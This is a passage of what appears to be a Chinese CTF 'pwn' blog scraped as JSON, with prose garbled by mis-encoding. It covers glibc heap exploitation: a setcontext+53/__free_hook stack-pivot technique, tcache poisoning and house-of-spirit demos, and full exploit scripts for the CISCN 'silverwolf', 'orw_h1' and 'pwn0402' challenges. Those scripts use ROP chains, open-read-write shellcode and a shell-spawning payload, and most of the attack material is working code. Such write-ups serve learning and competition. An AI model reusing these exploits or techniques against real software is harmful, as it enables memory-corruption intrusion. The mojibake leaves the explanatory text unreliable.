orwã€‚æ¥ä¸‹æ¥é—®é¢˜å°±æ¥äº†ï¼Œè™½ç„¶å¯ä»¥æ„é€ ROPé“¾ï¼Œä½†æ˜¯æ€ä¹ˆè°ƒç”¨å‘¢ï¼ŒROPé“¾éœ€è¦è®¾ç½®æ ˆä¸Šçš„å‚æ•°ï¼Œä»…ä»…é free_hookæˆ–è€…malloc_hookç­‰é’©å­å‡½æ•°æ˜¯æ— æ³•åˆ©ç”¨çš„ï¼Œå› æ­¤ä¹Ÿå°±æœ‰äº†setcontextã€‚\n&lt;setcontext&gt;:     push   rdi&lt;setcontext+1&gt;:   lea    rsi,[rdi+0x128]&lt;setcontext+8&gt;:   xor    edx,edx&lt;setcontext+10&gt;:  mov    edi,0x2&lt;setcontext+15&gt;:  mov    r10d,0x8&lt;setcontext+21&gt;:  mov    eax,0xe&lt;setcontext+26&gt;:  syscall &lt;setcontext+28&gt;:  pop    rdi&lt;setcontext+29&gt;:  cmp    rax,0xfffffffffffff001&lt;setcontext+35&gt;:  jae    0x7ffff7a7d520 &lt;setcontext+128&gt;&lt;setcontext+37&gt;:  mov    rcx,QWORD PTR [rdi+0xe0]&lt;setcontext+44&gt;:  fldenv [rcx]&lt;setcontext+46&gt;:  ldmxcsr DWORD PTR [rdi+0x1c0]&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]&lt;setcontext+94&gt;:  push   rcx&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]&lt;setcontext+125&gt;: xor    eax,eax&lt;setcontext+127&gt;: ret    &lt;setcontext+128&gt;: mov    rcx,QWORD PTR [rip+0x356951]        &lt;setcontext+135&gt;: neg    eax&lt;setcontext+137&gt;: mov    DWORD PTR fs:[rcx],eax&lt;setcontext+140&gt;: or     rax,0xffffffffffffffff&lt;setcontext+144&gt;: ret\ntips:è¿™é‡Œè®²è®²ä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨è€Œè¦ç”¨&lt;setcontext+53&gt;åŸå› æ˜¯æ‰§è¡Œåˆ°&lt;setcontext+44&gt;:  fldenv [rcx] çš„æ—¶å€™ç¨‹åºä¼šç›´æ¥crash\nä¸€èˆ¬åˆ©ç”¨æ–¹å¼æˆ‘ä»¬ä¼šå°†free_hookæˆ–è€…malloc_hookåœ°å€çš„å†…å®¹è¦†ç›–ä¸ºsetcontext+53ï¼Œæœ€åå†mallocæˆ–è€…freeä¸€ä¸‹ã€‚è¿™é‡Œç¨‹åºæµç¨‹å¯ä»¥è§£é‡Šå¦‚ä¸‹ï¼šæ‰§è¡Œfreeæˆ–è€…mallocåè·³è½¬åˆ°setcontext+53ï¼Œç„¶åå°†rspæŒ‡é’ˆæŒ‡å‘orwé“¾ï¼Œç„¶åä¿®æ”¹rcxçš„å€¼ä¸ºretæŒ‡ä»¤çš„åœ°å€ï¼Œpush rcxï¼Œè‡³äºå…¶å®ƒå¯„å­˜å™¨çš„å€¼æ­¤å¤„å¯ä»¥ä¸ç”¨åœ¨æ„ï¼Œæœ€åæ‰§è¡Œsetcontextæœ«å°¾åç´§é‚»çš„retnï¼Œæ ˆå¤´å‡ºæ ˆä¹Ÿè¿˜æ˜¯retæŒ‡ä»¤ï¼Œç„¶åç»§ç»­å¼¹å‡ºï¼Œæ­¤æ—¶çš„rspæŒ‡å‘çš„åœ°å€æ­£å¥½æ˜¯orwé“¾çš„å¼€å¤´ã€‚â€ƒâ€ƒsetcontextçš„å…·ä½“æ“ä½œä¹Ÿå°±æ˜¯è¿™æ ·ï¼Œè¿™é‡Œæœ€åå†è¡¥å……ä¸€ä¸ªç‚¹ï¼Œå‰é¢æˆ‘ä»¬ä¸ºäº†ä¿®æ”¹rspå’Œrcxçš„å€¼éœ€è¦æ‰¾å‡†åç§»ï¼Œä¸€èˆ¬æˆ‘ä»¬å¯ä»¥æ‰‹ç®—ä¸€ä¸‹ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åˆ©ç”¨pwntoolsçš„SigreturnFrameç±»ç›´æ¥æ¥æ„é€ ã€‚æ­¤æ—¶frameä¸­çš„rspå’Œripå¯¹åº”çš„å°±æ˜¯setcontextçš„rspå’Œrcxã€‚\nfrom pwn import *context.arch = &quot;amd64&quot;#è¿™ä¸ªå¿…é¡»è¦è®¾ç½®ï¼ŒåŒsropframe = SigreturnFrame()frame.rsp = 0xaaframe.rip = 0xbb\nçœ‹é“ä¾‹é¢˜å§~[CISCN 2021 åˆèµ›]silverwolfchecksec\n[*] &#x27;/home/str1k3/Desktop/silverwolf&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled    FORTIFY:  Enabled\nå­˜åœ¨æ²™ç›’\nroot@ubuntu:/home/str1k3/Desktop# seccomp-tools dump &#x27;/home/str1k3/Desktop/silverwolf&#x27;  line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008 0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0009: 0x06 0x00 0x00 0x00000000  return KILL\n\nNSSä¸Šç»™çš„æ˜¯glibc2.27ï¼Œæ®è¯´å½“æ—¶å‘ç°æ˜¯glibc2.29ï¼Œç¯å¢ƒå¯èƒ½ä¸å¤§ä¸€æ ·ï¼Œexpç•™ç»™è‡ªå·±çœ‹\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)#p = process(&quot;./silverwolf&quot;)p = remote(&quot;node4.anna.nssctf.cn&quot;,28768)libc = ELF(&quot;./libc-2.27.so&quot;)def choice(choice):  p.recvuntil(&quot;choice: &quot;)  p.sendline(str(choice))def add(index,size):  choice(1)  p.recvuntil(&quot;Index: &quot;)  p.sendline(str(index))  p.recvuntil(&quot;Size: &quot;)  p.sendline(str(size))  def edit(index,content):  choice(2)  p.recvuntil(&quot;Index: &quot;)  p.sendline(str(index))  p.recvuntil(&quot;Content: &quot;)  p.sendline(content)  def show(index):  choice(3)  p.recvuntil(&quot;Index: &quot;)  p.sendline(str(index))  def free(index):  choice(4)  p.recvuntil(&quot;Index: &quot;)  p.sendline(str(index))def clean():  for i in range(7):    add(0,0x78)  for i in range(12):    add(0,0x18)  for i in range(14):    add(0,0x68)  add(0,0x58)#æ²™ç›’ä¼šå½±å“å †é£æ°´ï¼Œç®€å•æ¢å¤ï¼Œå…·ä½“ä¸æ˜¯å¾ˆæ¸…æ¥šå‘œå‘œå‘œclean()add(0,0x28)free(0)edit(0,p64(0)*2)free(0)add(0,0x28)show(0)p.recvuntil(&quot;Content: &quot;)heap_base = u64(p.recv(6).ljust(8,b&quot;\\x00&quot;)) &amp; 0xFFFFFFFFFFFFF000-0x1000success(&quot;heap:&quot; + hex(heap_base))edit(0,p64(heap_base+0x10))add(0,0x28)add(0,0x28)edit(0,p64(0)*4+p64(0x7000000))free(0)show(0)libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;)) - 0x3ebca0free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]setcontext = libc_base + libc.sym[&#x27;setcontext&#x27;] + 53add(0,0x48)edit(0,p64(0)*9)add(0,0x18)edit(0,p64(heap_base+0x50))add(0,0x38)payload = p64(free_hook) #18payload += p64(heap_base + 0x2000) #28   payload += p64(heap_base + 0x20a0) #38      payload += p64(heap_base + 0x2000) #48payload += p64(heap_base + 0x1000) #58payload += p64(0) #68payload += p64(heap_base + 0x1000+0x58)#78edit(0,payload)pop_rax_ret = libc_base+0x0000000000043ae8pop_rdi_ret = libc_base+0x00000000000215bfpop_rsi_ret = libc_base+0x0000000000023eeapop_rdx_ret = libc_base+0x0000000000001b96ret = libc_base+0x0000000000023eebopen1 = libc_base + libc.sym[&#x27;open&#x27;]read = libc_base + libc.sym[&#x27;read&#x27;]write = libc_base + libc.sym[&#x27;write&#x27;]alarm = libc_base + libc.sym[&#x27;alarm&#x27;]syscall = alarm+0x5flag_addr = heap_base+0x2000success(&quot;libc base:%s&quot;, hex(libc_base))success(&quot;setcontext_53:%s&quot;, hex(setcontext))success(&quot;free_hook:%s&quot;, hex(free_hook))# rop chainrop = p64(pop_rdi_ret)+p64(flag_addr)rop += p64(pop_rsi_ret)+p64(0)rop += p64(pop_rax_ret)+p64(2)rop += p64(syscall)rop += p64(pop_rdi_ret)+p64(3)rop += p64(pop_rsi_ret)+p64(flag_addr)rop += p64(pop_rdx_ret)+p64(0x30)rop += p64(pop_rax_ret)+p64(0)rop += p64(syscall)rop += p64(pop_rdi_ret)+p64(1)rop += p64(pop_rsi_ret)+p64(flag_addr)rop += p64(pop_rdx_ret)+p64(0x30)rop += p64(pop_rax_ret)+p64(1)rop += p64(syscall)add(0,0x18)edit(0,p64(setcontext))  #hijack  free_hook  to setcontext+53add(0,0x28)edit(0,b&#x27;./flag\\x00\\x00&#x27;)  #./flag in heap + 0x2000  -- rdiadd(0,0x38)edit(0,p64(heap_base + 0x1000) + p64(ret))  # mov rsp , [rdi+0a0h]# rop in heap+0x10000add(0,0x58)edit(0,rop[:0x58])add(0,0x78)edit(0,rop[0x58:])# setcontext(rop)add(0,0x48)free(0)p.interactive()","categories":["heap"],"tags":["hook"]},{"title":"the_Belt_and_Road_review","url":"/2023/10/24/the-Belt-and-Road-review/","content":"ä¸‰ä¸ªå°æ—¶çš„ç†è®º+CTFï¼Œå…¨æ‰“ç†è®ºå»äº†:(ä¸€å¸¦ä¸€è·¯åˆèµ›é¢˜ç›®é™„ä»¶orw_h1checksec\nâ””â”€$ checksec orw_h1[*] &#x27;/Desktop/pwn/orw_h1&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\nsandbox\nstr1k3@ubuntu:~/Desktop$ seccomp-tools dump &#x27;/var/run/vmblock-fuse/blockdir/fTF0Ly/orw_h1&#x27;  line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005 0004: 0x06 0x00 0x00 0x00000000  return KILL 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW\ndeleteå­˜åœ¨UAF\nif ( v1 &lt;= 0x1E &amp;&amp; *((_QWORD *)&amp;unk_202060 + (int)v1) )&#123;  free(*((void **)&amp;unk_202060 + (int)v1));  puts(&quot;delete done.&quot;);&#125;\nglibc2.27\nfrom pwn import *#from LibcSearcher import*from ctypes import *from struct import packfrom pwn import u64,p64context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)one_gadget=[0x4f2a5,0x4f302,0x10a2fc]p = process(&#x27;./orw_h1&#x27;)#p = remote(&#x27;106.15.38.114&#x27;, 32832)elf = ELF(&#x27;./orw_h1&#x27;)libc = ELF(&#x27;libc-2.27.so&#x27;)def debug():    gdb.attach(p)    pause()def add(size,idx):    p.sendlineafter(b&#x27;&gt;&gt;&#x27;,b&#x27;1&#x27;)    p.sendlineafter(b&#x27;description:&#x27;,str(size))    p.sendlineafter(b&#x27;Game description:&#x27;,str(idx))def delete(idx):    p.sendlineafter(b&#x27;&gt;&gt;&#x27;,b&#x27;2&#x27;)    p.sendlineafter(b&#x27;game index: &#x27;,str(idx))def edit(idx1,idx2):    p.sendlineafter(b&#x27;&gt;&gt;&#x27;,b&#x27;3&#x27;)    p.sendlineafter(b&#x27;game index: &#x27;,str(idx1))    p.sendlineafter(b&#x27;Game description:&#x27;,str(idx2))def show(idx):    p.sendlineafter(b&#x27;&gt;&gt;&#x27;,b&#x27;4&#x27;)    p.sendlineafter(b&#x27;game index: &#x27;,str(idx))def exit():    p.sendlineafter(b&#x27;&gt;&gt;&#x27;,b&#x27;5&#x27;)#å…ˆæ³„éœ²libcåœ°å€add(0x80,&#x27;aaaa&#x27;) #1dx0add(0x130,&#x27;bbbb&#x27;) #idx1add(0x130,&#x27;bbbb&#x27;)#idx2for i in range(7):  add(128)for i in range(3, 10):  delete(i)delete(0)show(0)p.recv()libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;)) - 0x3ebca0free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]setcontext = libc_base + libc.sym[&#x27;setcontext&#x27;] + 53success(&quot;libc base:%s&quot;, hex(libc_base))success(&quot;setcontext_53:%s&quot;, hex(setcontext))success(&quot;free_hook:%s&quot;, hex(free_hook))#è²Œä¼¼gadgetsæ‰¾ä¸é½ï¼Œè¿™é‡Œç”¨å®˜æ–¹wpçš„#æ‰“free_hookï¼Œåˆ©ç”¨setcontextå¼€è¾Ÿç»™shellcodeçš„å†…å­˜ç©ºé—´#æ¥æ‰§è¡Œorwçš„shellcode#pop_rax_ret = libc_base+0x0000000000043ae8#pop_rdi_ret = libc_base+0x0000000000001193#pop_rsi_ret = libc_base+0x0000000000023eea#pop_rdx_ret = libc_base+0x0000000000001b96#ret = libc_base+0x0000000000000909#open1 = libc_base + libc.sym[&#x27;open&#x27;]#read = libc_base + libc.sym[&#x27;read&#x27;]#write = libc_base + libc.sym[&#x27;write&#x27;]#alarm = libc_base + libc.sym[&#x27;alarm&#x27;]#syscall = alarm+0x5#flag_addr = heap_base+0x2000newexe = free_hook &amp; 0xffffffffff000shellcode1 = &#x27;&#x27;&#x27;xor rdi,rdimov rsi,%dmov edx,0x1000mov eax,0syscalljmp rsi&#x27;&#x27;&#x27;% newexe#ä¼ªé€ setcontextframe = SigreturnFrame()framersp = free_hook+0x10frame.rdi = newexeframe.rsi = 0x1000frame.rdx = 7frame.rip = libc.sym[&#x27;mprotect&#x27;]#éšæ„æ‰¾çš„orwshellcode2= asm(&#x27;&#x27;&#x27; push 0x67616c66 mov rdi,rsp xor esi,esi push 2 pop rax syscall mov rdi,rax mov rsi,rsp mov edx,0x100 xor eax,eax syscall mov edi,1 mov rsi,rsp push 1 pop rax syscall &#x27;&#x27;&#x27;)delete(1)edit(1, p64(free_hook))add(0x130)payload = p64(setcontext+53)+p64(free_hook+0x18)*2+asm(shellcode1)add(0x130, payload)edit(2, str(frame))delete(2)p.sendline(shellcode2)p.interactive()\n\npwn0402å•¥éƒ½æ²¡å¼€\nâ””â”€$ checksec pwn0402[*] &#x27;/Desktop/pwn0402&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segments\n\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v3; // edx  int v4; // ecx  int v5; // r8d  int v6; // r9d  char v8[132]; // [rsp+0h] [rbp-90h] BYREF  int v9; // [rsp+84h] [rbp-Ch]  int i; // [rsp+88h] [rbp-8h]  int j; // [rsp+8Ch] [rbp-4h]  init_0();  printf((unsigned int)&quot;secret: %p\\n&quot;, (unsigned int)v8, v3, v4, v5, v6, v8[0]);  length = read(0LL, v8, 296LL);//æº¢å‡º  i = 0;  v9 = strlen(nosecurity_string);  for ( i = 0; i &lt; length; ++i )  &#123;    for ( j = 0; j &lt; v9; ++j )    &#123;      if ( nosecurity_string[j] == v8[i] )        exit(0LL);    &#125;  &#125;//æ£€æŸ¥ï¼Œè¿‡æ»¤äº†&#x27;CTctGFlagSNH/binsh&#x27;  return 0;&#125;\næ ¹æœ¬ä¸èµ°æ£€æŸ¥:)\nfrom pwn import *#from LibcSearcher import*from ctypes import *from struct import packfrom pwn import u64,p64context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)p = process(&#x27;./pwn0402&#x27;)main = 0x400A05p.recvuntil(&#x27;secret: &#x27;)data = int(p.recvline(),16) #æ³„éœ²æº¢å‡ºç‚¹ä½ç½®rdx_rsi = 0x0000000000442b89 # pop rdx ; pop rsi ; retpop_rdi = 0x00000000004016e6gdb.attach(p,&#x27;b *0x0400ABF&#x27;)pause()success(&quot;v8:%s&quot;, hex(data))payload = b&#x27;&#x27;.ljust(0x98,b&#x27;\\x90&#x27;)#æº¢å‡ºpayload += p64(rdx_rsi)payload += p64(0x100) + p64(data + 200)#== read (0,data+200,0x100)payload += p64(pop_rdi) payload += p64(0)payload += p64(0x0412ECB) #call_read p.sendline(payload)#gdb.attach(p)#pause()#ç°åœ¨è°ƒç”¨readçš„ropé“¾å·²ç»æ‰§è¡Œ==ç°åœ¨å†è°ƒç”¨ä¸€æ¬¡read#æŠŠshellcodeå†™è¿›å»ï¼Œæ•´ä¸ªæ ˆéƒ½æ˜¯å¯æ‰§è¡Œçš„p.sendline(p64(data+210)+b&#x27;\\x90&#x27;*20+asm(shellcraft.sh()))\n","categories":["wp"],"tags":["wp"]},{"title":"tcachebin_attack","url":"/2023/08/30/tcachebin-attack/","content":"about tcacheåœ¨glibcç‰ˆæœ¬2.26(å¯ä»¥ç®€å•è®°æˆ18.04å)ä»¥åï¼ŒåŠ å…¥äº†tcache(Thread Local Caching)æœºåˆ¶\nè¿™é‡Œæ”¾ä¸Štcacheçš„å®šä¹‰\n#if USE_TCACHE/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */# define TCACHE_MAX_BINS        64# define MAX_TCACHE_SIZE    tidx2usize (TCACHE_MAX_BINS-1)/* Only used to pre-fill the tunables.  */# define tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)/* When &quot;x&quot; is from chunksize().  */# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)/* When &quot;x&quot; is a user-provided size.  */# define usize2tidx(x) csize2tidx (request2size (x))/* With rounding and alignment, the bins are...   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)   idx 1   bytes 25..40 or 13..20   idx 2   bytes 41..56 or 21..28   etc.  *//* This is another arbitrary limit, which tunables can change.  Each   tcache bin will hold at most this number of chunks.  */# define TCACHE_FILL_COUNT 7#endif\ntcacheæœºåˆ¶é€šè¿‡ç»´æŠ¤å¤šä¸ªå¤§å°ä¸åŒçš„é“¾è¡¨æ¥å­˜å‚¨å·²è¢«é‡Šæ”¾ä½†å°šæœªé‡æ–°åˆ†é…çš„å †å—ã€‚æ¯ä¸ªé“¾è¡¨å¯¹åº”ä¸€ä¸ªç‰¹å®šçš„å †å—å¤§å°ï¼Œå¹¶ä¸”æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„tcacheé“¾è¡¨ã€‚å½“ç¨‹åºè¯·æ±‚åˆ†é…ä¸€ä¸ªå †å—æ—¶ï¼Œtcacheä¼šé¦–å…ˆæ£€æŸ¥æ˜¯å¦æœ‰åˆé€‚å¤§å°çš„ç©ºé—²å—å¯ç”¨ï¼Œå¦‚æœæœ‰ï¼Œåˆ™ç›´æ¥ä»tcacheä¸­åˆ†é…ç»™ç¨‹åºã€‚\ntcacheæœºåˆ¶ä¸»è¦æœ‰ä¸‰ä¸ªä¼˜ç‚¹ï¼š\nå‡å°‘äº†å¯¹å…¨å±€é”çš„ç«äº‰ï¼šç”±äºæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„tcacheé“¾è¡¨ï¼Œæ‰€ä»¥çº¿ç¨‹ä¹‹é—´ä¸éœ€è¦ç«äº‰å…¨å±€é”ï¼Œä»è€Œå‡å°‘äº†é”çš„å¼€é”€ã€‚å¿«é€Ÿçš„å†…å­˜åˆ†é…å’Œé‡Šæ”¾ï¼šç”±äºtcacheåªåŒ…å«å·²ç»é‡Šæ”¾ä½†å°šæœªé‡æ–°åˆ†é…çš„å †å—ï¼Œæ‰€ä»¥å¯ä»¥å¿«é€Ÿåœ°è¿›è¡Œå†…å­˜åˆ†é…å’Œé‡Šæ”¾æ“ä½œã€‚å‡å°‘ç¢ç‰‡åŒ–ï¼štcacheæœºåˆ¶ä½¿å¾—ç›¸åŒå¤§å°çš„å †å—å¯ä»¥è¢«é‡å¤ä½¿ç”¨ï¼Œå‡å°‘äº†å †å†…å­˜çš„ç¢ç‰‡åŒ–é—®é¢˜ã€‚\nå®ƒä¸ºæ¯ä¸ªçº¿ç¨‹åˆ›å»ºä¸€ä¸ªç¼“å­˜ï¼Œé‡Œé¢åŒ…å«äº†ä¸€äº›å°å †å—ã€‚æ¯ä¸ªçº¿ç¨‹é»˜è®¤ä½¿ç”¨64ä¸ªå•é“¾è¡¨ç»“æ„çš„binsï¼Œæ¯ä¸ªbinsæœ€å¤šå­˜æ”¾7ä¸ªchunkï¼Œ64ä½æœºå™¨16å­—èŠ‚é€’å¢ï¼Œä»0x20åˆ°0x410ï¼Œä¹Ÿå°±æ˜¯è¯´ä½äºä»¥ä¸Šå¤§å°çš„chunké‡Šæ”¾åéƒ½ä¼šå…ˆè¡Œå­˜å…¥åˆ°tcache_binä¸­ã€‚å¯¹äºæ¯ä¸ªtcache_binå•é“¾è¡¨ï¼Œå®ƒå’Œfast_binä¸€æ ·éƒ½æ˜¯å…ˆè¿›åå‡ºï¼Œè€Œä¸”prev_inuseæ ‡è®°ä½éƒ½ä¸ä¼šè¢«æ¸…é™¤ï¼Œæ‰€ä»¥tcache_binä¸­çš„chunkä¸ä¼šè¢«åˆå¹¶ï¼Œå³ä½¿å’ŒTop_chunkç›¸é‚»ã€‚\nâ€ƒâ€ƒå¦å¤–tcacheæœºåˆ¶å‡ºç°åï¼Œæ¯æ¬¡äº§ç”Ÿå †éƒ½ä¼šå…ˆäº§ç”Ÿä¸€ä¸ª0x250å¤§å°çš„å †å—ï¼Œè¯¥å †å—ä½äºå †çš„å¼€å¤´ï¼Œç”¨äºè®°å½•64ä¸ªbinsçš„åœ°å€ï¼ˆè¿™äº›åœ°å€æŒ‡å‘ç”¨æˆ·æ•°æ®éƒ¨åˆ†ï¼‰ä»¥åŠæ¯ä¸ªbinsä¸­chunkæ•°é‡ã€‚åœ¨è¿™ä¸ª0x250å¤§å°çš„å †å—ä¸­ï¼Œå‰0x40ä¸ªå­—èŠ‚ç”¨äºè®°å½•æ¯ä¸ªbinsä¸­chunkæ•°é‡ï¼Œæ¯ä¸ªå­—èŠ‚å¯¹åº”ä¸€æ¡tcache_biné“¾çš„æ•°é‡ï¼Œä»0x20å¼€å§‹åˆ°0x410ç»“æŸï¼Œåˆšå¥½64æ¡é“¾ï¼Œç„¶åå‰©ä¸‹çš„æ¯8å­—èŠ‚è®°å½•ä¸€æ¡tcache_biné“¾çš„å¼€å¤´åœ°å€ï¼Œä¹Ÿæ˜¯ä»0x20å¼€å§‹åˆ°0x410ç»“æŸã€‚è¿˜æœ‰ä¸€ç‚¹å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œtcache_binä¸­çš„fdæŒ‡é’ˆæ˜¯æŒ‡å‘mallocè¿”å›çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·æ•°æ®éƒ¨åˆ†ã€‚\nattackç»•è¿‡tcacheæœºåˆ¶çš„æ–¹æ³•åœ¨ä¸Šä¸€ç¯‡unsorted_biné‡Œæœ‰è¯´æ˜\ntcache poisoning\n//gcc how2heap2.c -g -no-pie -o tcache_bin#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123;    // åœ¨fckå¤„åˆ†é…å †å—    unsigned long fck;    printf(&quot;fck addr is %p\\n&quot;, &amp;fck);    unsigned long * ptr = malloc(0x80);//chunk1    printf(&quot;malloc ptr addr is %p\\n&quot;, ptr);    free(ptr);    // åªéœ€ä¿®æ”¹fdæŒ‡é’ˆï¼Œç”³è¯·çš„å¤§å°å’Œå½“å‰tcache binå¤§å°ç›¸åŒå³å¯    ptr[0] = (unsigned long)&amp;fck;    malloc(0x80);//chunk2    printf(&quot;the second malloc addr is %p\\n&quot;, malloc(0x80));    return 0;&#125;\næ”»å‡»æ•ˆæœå¦‚ä¸‹\npwndbg&gt; rStarting program: /home/str1k3/Desktop/tcache_bin fck addr is 0x7fffffffe2e8malloc ptr addr is 0x602670the second malloc addr is 0x7fffffffe2e8[Inferior 1 (process 3147) exited normally]\nå¯ä»¥çœ‹åˆ°chunk2çš„åœ°å€è¢«ä¿®æ”¹åˆ°äº†0x7fffffffe2e8ã€‚\ntcache house of spirit\n//gcc tcache_house_of_spirit.c -g -no-pie -o tcache_house_of_spirit#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123;    unsigned long target[4];    malloc(1);  // åˆå§‹åŒ–å †ç¯å¢ƒ        // ä¼ªé€ fake_chunkï¼Œè¯•å›¾é‡Šæ”¾åå†æ¬¡åˆ†é…å¾—åˆ°è¯¥åœ°å€çš„å †å—    printf(&quot;your target addr is %p\\n&quot;, target+2);    target[1] = 0x90;    free(target+2);    printf(&quot;now malloc addr is %p\\n&quot;, malloc(0x80));    //success     return 0;&#125;\nfreeå®Œfake_chunkåçš„binï¼š\npwndbg&gt; bintcachebins0x90 [  1]: 0x7fffffffe2d0 â—‚â€” 0x0\næˆåŠŸå¾—åˆ°ä½äº0x7fffffffe2d0çš„å †å—\nè¯¥æ”»å‡»å…³é”®åœ¨äºæ„é€ å¥½fake_chunkçš„sizeï¼Œä»¥åŠé‡Šæ”¾å †å—å¯¹åº”çš„ç”¨æˆ·æ•°æ®åœ°å€\nleak_libc_baseåŒunsorted_bin_attack\nleak_heap_baseeasy_double_free\nglibcç‰ˆæœ¬2.28å‰ï¼Œæ²¡æœ‰å¯¹tcacheäºŒæ¬¡é‡Šæ”¾çš„æ£€æŸ¥å› æ­¤åœ¨glibc_2.26åˆ°glibc_2.27çš„è€ç‰ˆæœ¬ä¹‹é—´å¯ä»¥åˆ©ç”¨double_freeæ¥æ³„éœ²å †åŸºå€\n//gcc double_free.c -g -no-pie -o double_free#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;    unsigned long *ptr = malloc(0x80);    free(ptr);    free(ptr);  // double free    printf(&quot;heap addr is %ld\\n&quot;, ptr[0]);    return 0;&#125;\nè¿™ä¸ªè¿‡æ¸¡ç‰ˆçš„glibcæœ‰ç‚¹éš¾æ‰¾ï¼Œç­‰ç¯å¢ƒæ­èµ·æ¥å†æ¥å¤ç°easy_double_free\ndouble_freeé‚£ä¹ˆé«˜ç‰ˆæœ¬çš„glibcèƒ½double_freeå—ï¼Ÿæ˜¯å¯ä»¥çš„ï¼Œå…ˆçœ‹çœ‹æ£€æŸ¥æœºåˆ¶\ntypedef struct tcache_entry&#123;  struct tcache_entry *next;  //æŒ‡å‘chunkçš„fd  /* This field exists to detect double frees.  */  struct tcache_perthread_struct *key;  //æŒ‡å‘chunkçš„bk&#125; tcache_entry;\nå¯¹äºæ¯ä¸€ä¸ªtcacheéƒ½æœ‰ä¸€ä¸ªkeyæŒ‡é’ˆæŒ‡å‘\nsize_t tc_idx = csize2tidx(size);//åªè¦tcacheä¸ä¸ºç©º å¹¶ä¸”free chunkåœ¨tcacheèŒƒå›´ä¸­ éƒ½éœ€è¦è¿›è¡Œdouble freeæ£€æŸ¥    if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)    &#123;      /* Check to see if it&#x27;s already in the tcache.  */      tcache_entry *e = (tcache_entry *)chunk2mem(p);       /*        å¦‚æœæ˜¯è¿™ä¸ªchunkå·²ç»è¢«æ”¾å…¥tcache é‚£ä¹ˆkeyå­—æ®µå°±å·²ç»æœ‰æ•°æ®äº† ä¼šè¢«è¯†åˆ«å‡ºæ¥      */      if (__glibc_unlikely(e-&gt;key == tcache))//æ±‡æŠ¥é”™è¯¯ä¿¡æ¯      &#123;        tcache_entry *tmp;        LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx);        for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)          if (tmp == e)            malloc_printerr(&quot;free(): double free detected in tcache 2&quot;);      &#125;       if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  //é€šè¿‡æ£€æŸ¥ï¼Œæ”¾å…¥tcahceä¸­      &#123;        tcache_put(p, tc_idx);        return;      &#125;    &#125;\næ‰€ä»¥ 